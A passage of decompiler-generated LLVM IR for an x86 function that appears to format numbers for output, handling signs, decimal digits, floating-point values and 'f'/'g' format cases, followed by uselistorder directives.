  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055056

dec_label_pc_8055056:                             ; preds = %dec_label_pc_8055026, %dec_label_pc_805503b
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_805503b ], [ %stack_var_-132, %dec_label_pc_8055026 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055076

dec_label_pc_805505a:                             ; preds = %dec_label_pc_8055016
  %v4_805505c = icmp eq i1 %v1_8055012, false
  br i1 %v4_805505c, label %dec_label_pc_8055067, label %dec_label_pc_805505e

dec_label_pc_805505e:                             ; preds = %dec_label_pc_805505a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055061

dec_label_pc_8055061:                             ; preds = %dec_label_pc_8054fdd, %dec_label_pc_805505e
  %v0_80550a9112 = phi i32 [ %v1_805506d, %dec_label_pc_8054fdd ], [ -1, %dec_label_pc_805505e ]
  %v2_8055061 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8055061, i32* @ecx, align 4
  br label %dec_label_pc_8055076

dec_label_pc_8055067:                             ; preds = %dec_label_pc_805505a
  %v2_805506b = add i32 %v1_8054fec, %v1_805506d
  store i32 %v2_805506b, i32* %edi.global-to-local, align 4
  %v2_805506d = sub i32 %v2_8055010, %v1_805506d
  store i32 %v2_805506d, i32* %edx.global-to-local, align 4
  %v2_805506f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805506f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055076

dec_label_pc_8055076:                             ; preds = %dec_label_pc_8055061, %dec_label_pc_8055056, %dec_label_pc_8055067
  %v0_80550a9111 = phi i32 [ %v0_80550a9112, %dec_label_pc_8055061 ], [ -1, %dec_label_pc_8055056 ], [ -1, %dec_label_pc_8055067 ]
  %v0_8055092 = phi i32 [ %v2_8055061, %dec_label_pc_8055061 ], [ %storemerge28, %dec_label_pc_8055056 ], [ %v2_805506f, %dec_label_pc_8055067 ]
  %v0_8055083 = phi i32 [ %v2_8055010, %dec_label_pc_8055061 ], [ 0, %dec_label_pc_8055056 ], [ %v2_805506d, %dec_label_pc_8055067 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_805507d = inttoptr i32 %v1_8054cf3 to i8*
  %v3_805507d = load i8, i8* %v2_805507d, align 1
  %v4_805507d = and i8 %v3_805507d, 16
  %v5_805507d = icmp eq i8 %v4_805507d, 0
  %v1_8055081 = icmp eq i1 %v5_805507d, false
  br i1 %v1_8055081, label %dec_label_pc_8055092, label %dec_label_pc_8055083

dec_label_pc_8055083:                             ; preds = %dec_label_pc_8055076
  %v1_8055083 = icmp eq i32 %v0_8055083, 0
  %v1_8055085 = icmp eq i1 %v1_8055083, false
  br i1 %v1_8055085, label %dec_label_pc_8055092, label %dec_label_pc_8055087

dec_label_pc_8055087:                             ; preds = %dec_label_pc_8055083
  br i1 %v12_8054eeb, label %dec_label_pc_80550a9, label %dec_label_pc_805508e

dec_label_pc_805508e:                             ; preds = %dec_label_pc_8055087
  %v0_805508e = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805508e, 1
  br i1 %tmp189, label %dec_label_pc_80550a9, label %dec_label_pc_8055092

dec_label_pc_8055092:                             ; preds = %dec_label_pc_805508e, %dec_label_pc_8055083, %dec_label_pc_8055076
  %v1_8055092 = inttoptr i32 %v0_8055092 to i32*
  store i32 112, i32* %v1_8055092, align 4
  %v0_8055098 = load i32, i32* @ecx, align 4
  %v1_8055098 = add i32 %v0_8055098, 4
  %v2_8055098 = inttoptr i32 %v1_8055098 to i32*
  store i32 1, i32* %v2_8055098, align 4
  %v0_805509f = load i32, i32* @ecx, align 4
  %v1_805509f = add i32 %v0_805509f, 8
  %v2_805509f = inttoptr i32 %v1_805509f to i32*
  store i32 ptrtoint (i32* @global_var_805cda0.293 to i32), i32* %v2_805509f, align 4
  %v0_80550a6 = load i32, i32* @ecx, align 4
  %v1_80550a6 = add i32 %v0_80550a6, 12
  store i32 %v1_80550a6, i32* @ecx, align 4
  %v0_80550a9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550a9

dec_label_pc_80550a9:                             ; preds = %dec_label_pc_805508e, %dec_label_pc_8055087, %dec_label_pc_8055092
  %v0_80550b0 = phi i32 [ %v0_8055092, %dec_label_pc_805508e ], [ %v0_8055092, %dec_label_pc_8055087 ], [ %v1_80550a6, %dec_label_pc_8055092 ]
  %v0_80550a9 = phi i32 [ %v0_80550a9111, %dec_label_pc_805508e ], [ %v0_80550a9111, %dec_label_pc_8055087 ], [ %v0_80550a9.pre, %dec_label_pc_8055092 ]
  %v1_80550a9 = add i32 %v0_80550a9, 1
  %v8_80550a9 = icmp eq i32 %v1_80550a9, 0
  store i32 %v1_80550a9, i32* %ebx.global-to-local, align 4
  br i1 %v8_80550a9, label %dec_label_pc_80550c3, label %dec_label_pc_80550ac

dec_label_pc_80550ac:                             ; preds = %dec_label_pc_80550a9
  %v1_80550ae = sub i32 -1, %v0_80550a9
  store i32 %v1_80550ae, i32* %eax.global-to-local, align 4
  %v1_80550b0 = inttoptr i32 %v0_80550b0 to i32*
  store i32 176, i32* %v1_80550b0, align 4
  %v0_80550b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80550b6 = load i32, i32* @ecx, align 4
  %v2_80550b6 = add i32 %v1_80550b6, 4
  %v3_80550b6 = inttoptr i32 %v2_80550b6 to i32*
  store i32 %v0_80550b6, i32* %v3_80550b6, align 4
  %v0_80550b9 = load i32, i32* @ecx, align 4
  %v1_80550b9 = add i32 %v0_80550b9, 8
  %v2_80550b9 = inttoptr i32 %v1_80550b9 to i32*
  store i32 ptrtoint (i32* @global_var_805cd93.292 to i32), i32* %v2_80550b9, align 4
  %v0_80550c0 = load i32, i32* @ecx, align 4
  %v1_80550c0 = add i32 %v0_80550c0, 12
  store i32 %v1_80550c0, i32* @ecx, align 4
  br label %dec_label_pc_80550c3

dec_label_pc_80550c3:                             ; preds = %dec_label_pc_80550a9, %dec_label_pc_80550ac
  %v0_80550c7 = phi i32 [ %v0_80550b0, %dec_label_pc_80550a9 ], [ %v1_80550c0, %dec_label_pc_80550ac ]
  %v0_80550c3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80550c3 = icmp eq i32 %v0_80550c3, 0
  br i1 %v1_80550c3, label %dec_label_pc_80550d6, label %dec_label_pc_80550c7

dec_label_pc_80550c7:                             ; preds = %dec_label_pc_80550c3
  %v1_80550c7 = inttoptr i32 %v0_80550c7 to i32*
  store i32 112, i32* %v1_80550c7, align 4
  %v0_80550cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80550cd = load i32, i32* @ecx, align 4
  %v2_80550cd = add i32 %v1_80550cd, 4
  %v3_80550cd = inttoptr i32 %v2_80550cd to i32*
  store i32 %v0_80550cd, i32* %v3_80550cd, align 4
  %v0_80550d0 = load i32, i32* %edi.global-to-local, align 4
  %v1_80550d0 = load i32, i32* @ecx, align 4
  %v2_80550d0 = add i32 %v1_80550d0, 8
  %v3_80550d0 = inttoptr i32 %v2_80550d0 to i32*
  store i32 %v0_80550d0, i32* %v3_80550d0, align 4
  %v0_80550d3 = load i32, i32* @ecx, align 4
  %v1_80550d3 = add i32 %v0_80550d3, 12
  store i32 %v1_80550d3, i32* @ecx, align 4
  br label %dec_label_pc_80550d6

dec_label_pc_80550d6:                             ; preds = %dec_label_pc_80550c3, %dec_label_pc_80550c7
  %v0_80550f4 = phi i32 [ %v0_80550c7, %dec_label_pc_80550c3 ], [ %v1_80550d3, %dec_label_pc_80550c7 ]
  br i1 %v1_8054ef0, label %dec_label_pc_80550ea, label %dec_label_pc_80550dd

dec_label_pc_80550dd:                             ; preds = %dec_label_pc_80550d6
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80550e4 = load i8, i8* %v2_805507d, align 1
  %v4_80550e4 = and i8 %v3_80550e4, 16
  %v5_80550e4 = icmp eq i8 %v4_80550e4, 0
  br i1 %v5_80550e4, label %dec_label_pc_8055107, label %dec_label_pc_80550ea

dec_label_pc_80550ea:                             ; preds = %dec_label_pc_80550dd, %dec_label_pc_80550d6
  %v0_80550ea = load i32, i32* %edx.global-to-local, align 4
  %v1_80550ec = load i32, i32* %ebx.global-to-local, align 4
  %v2_80550ec = sub i32 %v0_80550ea, %v1_80550ec
  store i32 %v2_80550ec, i32* %eax.global-to-local, align 4
  %v1_80550ee = load i32, i32* %ebp.global-to-local, align 4
  %v2_80550ee = sub i32 %v2_80550ec, %v1_80550ee
  %v8_80550ee = xor i32 %v1_80550ee, %v2_80550ec
  %v9_80550ee = xor i32 %v2_80550ee, %v2_80550ec
  %v10_80550ee = and i32 %v9_80550ee, %v8_80550ee
  %v11_80550ee = icmp slt i32 %v10_80550ee, 0
  %v13_80550ee = icmp slt i32 %v2_80550ee, 0
  %v2_80550f0 = icmp eq i1 %v13_80550ee, %v11_80550ee
  br i1 %v2_80550f0, label %dec_label_pc_8055107, label %dec_label_pc_80550f2

dec_label_pc_80550f2:                             ; preds = %dec_label_pc_80550ea
  %v2_80550f2 = sub i32 %v1_80550ee, %v2_80550ec
  store i32 %v2_80550f2, i32* %ebp.global-to-local, align 4
  %v1_80550f4 = inttoptr i32 %v0_80550f4 to i32*
  store i32 176, i32* %v1_80550f4, align 4
  %v0_80550fa = load i32, i32* %ebp.global-to-local, align 4
  %v1_80550fa = load i32, i32* @ecx, align 4
  %v2_80550fa = add i32 %v1_80550fa, 4
  %v3_80550fa = inttoptr i32 %v2_80550fa to i32*
  store i32 %v0_80550fa, i32* %v3_80550fa, align 4
  %v0_80550fd = load i32, i32* @ecx, align 4
  %v1_80550fd = add i32 %v0_80550fd, 8
  %v2_80550fd = inttoptr i32 %v1_80550fd to i32*
  store i32 ptrtoint (i32* @global_var_805cd93.292 to i32), i32* %v2_80550fd, align 4
  %v0_8055104 = load i32, i32* @ecx, align 4
  %v1_8055104 = add i32 %v0_8055104, 12
  store i32 %v1_8055104, i32* @ecx, align 4
  br label %dec_label_pc_8055107

dec_label_pc_8055107:                             ; preds = %dec_label_pc_80550ea, %dec_label_pc_80550dd, %dec_label_pc_80550f2
  %v1_805518f121 = phi i32 [ %v0_80550f4, %dec_label_pc_80550ea ], [ %v0_80550f4, %dec_label_pc_80550dd ], [ %v1_8055104, %dec_label_pc_80550f2 ]
  %v12_8055107 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8055107, label %dec_label_pc_8055182, label %dec_label_pc_805510e

dec_label_pc_805510e:                             ; preds = %dec_label_pc_8055107
  %v5_805510e = load i32, i32* %edx.global-to-local, align 4
  %v6_805510e = and i32 %v5_805510e, -256
  %v7_805510e = or i32 %v6_805510e, %stack_var_-42.0
  store i32 %v7_805510e, i32* %edx.global-to-local, align 4
  %v0_8055115 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055115 = icmp slt i32 %v0_8055115, 0
  %v1_8055117 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8055115, label %dec_label_pc_8055126, label %dec_label_pc_805512f

dec_label_pc_8055126:                             ; preds = %dec_label_pc_805510e
  store i32 %v0_8055115, i32* %edx.global-to-local, align 4
  %v1_8055128 = sub i32 0, %v0_8055115
  br label %dec_label_pc_805512f

dec_label_pc_805512f:                             ; preds = %dec_label_pc_805510e, %dec_label_pc_8055126
  %storemerge27 = phi i32 [ %v1_8055128, %dec_label_pc_8055126 ], [ %v0_8055115, %dec_label_pc_805510e ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8055126 ], [ 43, %dec_label_pc_805510e ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055137 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055137, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055143

dec_label_pc_8055143:                             ; preds = %dec_label_pc_8055143.backedge, %dec_label_pc_805512f
  %v0_805514e = phi i32 [ %v0_805514e.pre, %dec_label_pc_8055143.backedge ], [ %v2_8055137, %dec_label_pc_805512f ]
  %v0_805514b = phi i32 [ %v0_805514b.pre, %dec_label_pc_8055143.backedge ], [ 2, %dec_label_pc_805512f ]
  %v0_8055143 = phi i32 [ %v9_805514c, %dec_label_pc_8055143.backedge ], [ %storemerge27, %dec_label_pc_805512f ]
  %v1_805514a = ashr i32 %v0_8055143, 31
  %v1_805514b = add i32 %v0_805514b, 1
  store i32 %v1_805514b, i32* %edi.global-to-local, align 4
  %v2_805514c = zext i32 %v0_8055143 to i64
  %v4_805514c = zext i32 %v1_805514a to i64
  %v5_805514c = mul nuw i64 %v4_805514c, 4294967296
  %v6_805514c = or i64 %v5_805514c, %v2_805514c
  %v8_805514c = sdiv i64 %v6_805514c, 10
  %v9_805514c = trunc i64 %v8_805514c to i32
  %v10_805514c = srem i64 %v6_805514c, 10
  %v1_805514e = add i32 %v0_805514e, -1
  store i32 %v1_805514e, i32* %ebx.global-to-local, align 4
  store i32 %v9_805514c, i32* %esi.global-to-local, align 4
  %v3_8055151 = and i32 %v9_805514c, -256
  %v1_8055153 = trunc i64 %v10_805514c to i8
  %v2_8055153 = add i8 %v1_8055153, 48
  %v12_8055153 = zext i8 %v2_8055153 to i32
  %v15_8055153 = or i32 %v12_8055153, %v3_8055151
  store i32 %v15_8055153, i32* %eax.global-to-local, align 4
  %v3_8055158 = inttoptr i32 %v1_805514e to i8*
  store i8 %v2_8055153, i8* %v3_8055158, align 1
  store i32 %v9_805514c, i32* %edx.global-to-local, align 4
  %v7_805515c = icmp sgt i32 %v1_805514b, 3
  br i1 %v7_805515c, label %dec_label_pc_805515e, label %dec_label_pc_8055143.backedge

dec_label_pc_805515e:                             ; preds = %dec_label_pc_8055143
  %v2_805515e = icmp eq i32 %v9_805514c, 0
  %v1_8055160 = icmp eq i1 %v2_805515e, false
  br i1 %v1_8055160, label %dec_label_pc_8055143.backedge, label %dec_label_pc_8055162

dec_label_pc_8055143.backedge:                    ; preds = %dec_label_pc_805515e, %dec_label_pc_8055143
  %v0_805514b.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_805514e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055143

dec_label_pc_8055162:                             ; preds = %dec_label_pc_805515e
  %v4_8055162 = zext i8 %storemerge9 to i32
  %v7_8055162 = or i32 %v3_8055151, %v4_8055162
  store i32 %v7_8055162, i32* %edx.global-to-local, align 4
  %v0_8055166 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055166 = add i32 %v0_8055166, -2
  store i32 %v1_8055166, i32* %eax.global-to-local, align 4
  %v3_8055169 = add i32 %v0_8055166, -1
  %v4_8055169 = inttoptr i32 %v3_8055169 to i8*
  store i8 %storemerge9, i8* %v4_8055169, align 1
  %v5_805516c = load i32, i32* %edx.global-to-local, align 4
  %v6_805516c = and i32 %v5_805516c, -256
  %v7_805516c = or i32 %v6_805516c, %stack_var_-42.0
  store i32 %v7_805516c, i32* %edx.global-to-local, align 4
  %v2_8055170 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055170 = add i32 %v2_8055170, -2
  %v4_8055170 = inttoptr i32 %v3_8055170 to i8*
  store i8 %v1_8055117, i8* %v4_8055170, align 1
  %v0_8055173 = load i32, i32* @ecx, align 4
  %v1_8055173 = inttoptr i32 %v0_8055173 to i32*
  store i32 112, i32* %v1_8055173, align 4
  %v0_8055179 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055179 = load i32, i32* @ecx, align 4
  %v2_8055179 = add i32 %v1_8055179, 4
  %v3_8055179 = inttoptr i32 %v2_8055179 to i32*
  store i32 %v0_8055179, i32* %v3_8055179, align 4
  %v0_805517c = load i32, i32* %eax.global-to-local, align 4
  %v1_805517c = load i32, i32* @ecx, align 4
  %v2_805517c = add i32 %v1_805517c, 8
  %v3_805517c = inttoptr i32 %v2_805517c to i32*
  store i32 %v0_805517c, i32* %v3_805517c, align 4
  %v0_805517f = load i32, i32* @ecx, align 4
  %v1_805517f = add i32 %v0_805517f, 12
  store i32 %v1_805517f, i32* @ecx, align 4
  br label %dec_label_pc_8055182

dec_label_pc_8055182:                             ; preds = %dec_label_pc_8055107, %dec_label_pc_8054db1, %dec_label_pc_8055162
  %v0_8055201 = phi i32 [ %v1_805518f121, %dec_label_pc_8055107 ], [ %v2_8054db9, %dec_label_pc_8054db1 ], [ %v1_805517f, %dec_label_pc_8055162 ]
  %v2_8055182 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8055182, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055186

dec_label_pc_8055186:                             ; preds = %dec_label_pc_8055186, %dec_label_pc_8055182
  %v0_8055186 = phi i32 [ %v2_8055182, %dec_label_pc_8055182 ], [ %v1_8055188, %dec_label_pc_8055186 ]
  %stack_var_-216.0 = phi i32 [ %v3_8054cb3, %dec_label_pc_8055182 ], [ %v5_805518b, %dec_label_pc_8055186 ]
  %v1_8055186 = inttoptr i32 %v0_8055186 to i32*
  %v2_8055186 = load i32, i32* %v1_8055186, align 4
  store i32 %v2_8055186, i32* %ebx.global-to-local, align 4
  %v1_8055188 = add i32 %v0_8055186, 12
  store i32 %v1_8055188, i32* %eax.global-to-local, align 4
  %v5_805518b = sub i32 %stack_var_-216.0, %v2_8055186
  %v7_805518f = icmp ult i32 %v1_8055188, %v0_8055201
  br i1 %v7_805518f, label %dec_label_pc_8055186, label %dec_label_pc_8055193

dec_label_pc_8055193:                             ; preds = %dec_label_pc_8055186
  store i32 %v0_8055201, i32* %esi.global-to-local, align 4
  %v5_80551a6 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_80551b6 = icmp eq i1 %v5_80551a6, false
  %v2_80551b6 = zext i1 %v1_80551b6 to i32
  store i32 %v2_80551b6, i32* %edx.global-to-local, align 4
  %v2_80551b9 = sub i32 %v5_805518b, %v2_80551b6
  store i32 %v2_80551b9, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_80551b9, 1
  br i1 %tmp190, label %dec_label_pc_8055203, label %dec_label_pc_80551c3

dec_label_pc_80551c3:                             ; preds = %dec_label_pc_8055193
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80551ca = inttoptr i32 %v1_8054cf3 to i8*
  %v3_80551ca = load i8, i8* %v2_80551ca, align 1
  %v4_80551ca = and i8 %v3_80551ca, 8
  %v5_80551ca = icmp eq i8 %v4_80551ca, 0
  br i1 %v5_80551ca, label %dec_label_pc_80551e5, label %dec_label_pc_80551d0

dec_label_pc_80551d0:                             ; preds = %dec_label_pc_80551c3
  %v1_80551d0 = add i32 %v0_8055201, 12
  store i32 %v1_80551d0, i32* %esi.global-to-local, align 4
  %v1_80551d3 = inttoptr i32 %v0_8055201 to i32*
  store i32 160, i32* %v1_80551d3, align 4
  %v1_80551d9 = load i32, i32* @ecx, align 4
  %v2_80551d9 = add i32 %v1_80551d9, 4
  %v3_80551d9 = inttoptr i32 %v2_80551d9 to i32*
  store i32 %v2_80551b9, i32* %v3_80551d9, align 4
  %v0_80551dc = load i32, i32* @ecx, align 4
  %v1_80551dc = add i32 %v0_80551dc, 8
  %v2_80551dc = inttoptr i32 %v1_80551dc to i32*
  store i32 ptrtoint (i32* @global_var_805cd93.292 to i32), i32* %v2_80551dc, align 4
  br label %dec_label_pc_8055203

dec_label_pc_80551e5:                             ; preds = %dec_label_pc_80551c3
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80551ec = add i32 %tmp156, 16
  %v2_80551ec = inttoptr i32 %v1_80551ec to i32*
  %v3_80551ec = load i32, i32* %v2_80551ec, align 4
  %v9_80551ec = icmp eq i32 %v3_80551ec, 48
  %v1_80551f0 = icmp eq i1 %v9_80551ec, false
  br i1 %v1_80551f0, label %dec_label_pc_80551fd, label %dec_label_pc_80551f2

dec_label_pc_80551f2:                             ; preds = %dec_label_pc_80551e5
  %v3_80551f2 = load i32, i32* %stack_var_-152, align 4
  %v5_80551f2 = add i32 %v3_80551f2, %v2_80551b9
  store i32 %v5_80551f2, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055201

dec_label_pc_80551f8:                             ; preds = %dec_label_pc_8055209
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055230

dec_label_pc_80551fd:                             ; preds = %dec_label_pc_80551e5
  br label %dec_label_pc_8055201

dec_label_pc_8055201:                             ; preds = %dec_label_pc_80551f2, %dec_label_pc_80551fd
  store i32 %v0_8055201, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055203

dec_label_pc_8055203:                             ; preds = %dec_label_pc_8055193, %dec_label_pc_80551d0, %dec_label_pc_8055201
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8055205 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8055205, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055209

dec_label_pc_8055209:                             ; preds = %dec_label_pc_8055227, %dec_label_pc_8055203
  call void @__pseudo_call(i32 %tmp156)
  %v1_8055222 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055222 = add i32 %v1_8055222, 4
  %v3_8055222 = inttoptr i32 %v2_8055222 to i32*
  %v4_8055222 = load i32, i32* %v3_8055222, align 4
  %v15_8055222 = icmp eq i32 %v2_80551b9, %v4_8055222
  %v1_8055225 = icmp eq i1 %v15_8055222, false
  br i1 %v1_8055225, label %dec_label_pc_80551f8, label %dec_label_pc_8055227

dec_label_pc_8055227:                             ; preds = %dec_label_pc_8055209
  %v1_8055227 = add i32 %v1_8055222, 12
  store i32 %v1_8055227, i32* %ebx.global-to-local, align 4
  %v0_805522a = load i32, i32* %edi.global-to-local, align 4
  %v2_805522a = add i32 %v0_805522a, %v2_80551b9
  store i32 %v2_805522a, i32* %edi.global-to-local, align 4
  %v1_805522c = load i32, i32* %esi.global-to-local, align 4
  %v7_805522c = icmp ult i32 %v1_8055227, %v1_805522c
  br i1 %v7_805522c, label %dec_label_pc_8055209, label %dec_label_pc_8055230

dec_label_pc_8055230:                             ; preds = %dec_label_pc_8055227, %dec_label_pc_80551f8
  %v0_8055236 = phi i32 [ -1, %dec_label_pc_80551f8 ], [ %v2_805522a, %dec_label_pc_8055227 ]
  store i32 %v0_8055236, i32* %eax.global-to-local, align 4
  %v2_8055239 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055239, i32* @esi, align 4
  store i32 %v0_8054c96, i32* @edi, align 4
  store i32 %v0_8054c95, i32* @ebp, align 4
  ret i32 %v0_8055236

; uselistorder directives
  uselistorder i32 %v0_8055236, { 1, 0 }
  uselistorder i32 %v2_80551b9, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_80551b6, { 1, 0 }
  uselistorder i32 %v1_8055188, { 1, 2, 0 }
  uselistorder i32 %v0_8055186, { 1, 0 }
  uselistorder i32 %v0_8055201, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_805514c, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8055115, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80550ee, { 1, 0 }
  uselistorder i32 %v1_80550ee, { 1, 0, 2 }
  uselistorder i32 %v2_80550ec, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_80550a9, { 1, 0 }
  uselistorder i32 %v2_8055016, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055010, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805506d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8054fac, { 1, 0 }
  uselistorder i32 %v0_8054fa7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054f74, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8054f6f, { 1, 0 }
  uselistorder i8 %v2_8054f68, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8054f68, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8054ef2, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8054ed7, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054ea2, { 1, 0 }
  uselistorder i32 %v2_8054e5b, { 2, 1, 0 }
  uselistorder i32 %v0_8054f11, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8054e2d, { 1, 0 }
  uselistorder x86_fp80 %v3_8054e0f, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8054e0c, { 1, 0 }
  uselistorder x86_fp80 %v4_8054df4, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8054dee, { 1, 2, 0 }
  uselistorder i32 %v3_8054deb, { 1, 0 }
  uselistorder i32 %v1_8054de4, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8054e1d, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8054de5, { 1, 0 }
  uselistorder i8 %v4_8054d95, { 1, 0 }
  uselistorder i3 %v1_8054d32, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8054cba, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8054cb3, { 1, 0, 2 }
  uselistorder i3 %v4_8054cac, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 8, 7, 9, 2, 1, 3, 0, 6, 11, 5, 12, 4, 10 }
  uselistorder x86_fp80* %st0.global-to-local, { 4, 1, 2, 8, 5, 6, 0, 3, 7 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 26, 7, 8, 11, 13, 12, 14, 9, 10, 15, 18, 16, 19, 17, 20, 21, 22, 23, 24, 0, 25, 27, 28 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 1, 2, 0 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_8055203, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055201, { 1, 0 }
  uselistorder label %dec_label_pc_8055182, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805512f, { 1, 0 }
  uselistorder label %dec_label_pc_8055107, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550d6, { 1, 0 }
  uselistorder label %dec_label_pc_80550c3, { 1, 0 }
  uselistorder label %dec_label_pc_80550a9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055076, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055061, { 1, 0 }
  uselistorder label %dec_label_pc_8055056, { 1, 0 }
  uselistorder label %dec_label_pc_8054fdd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054fcf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054f95, { 1, 0 }
  uselistorder label %dec_label_pc_8054f65.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8054f31, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054f00, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054eeb, { 1, 0 }
  uselistorder label %dec_label_pc_8054e57, { 1, 0 }
  uselistorder label %dec_label_pc_8054e2f, { 2, 0, 1 }
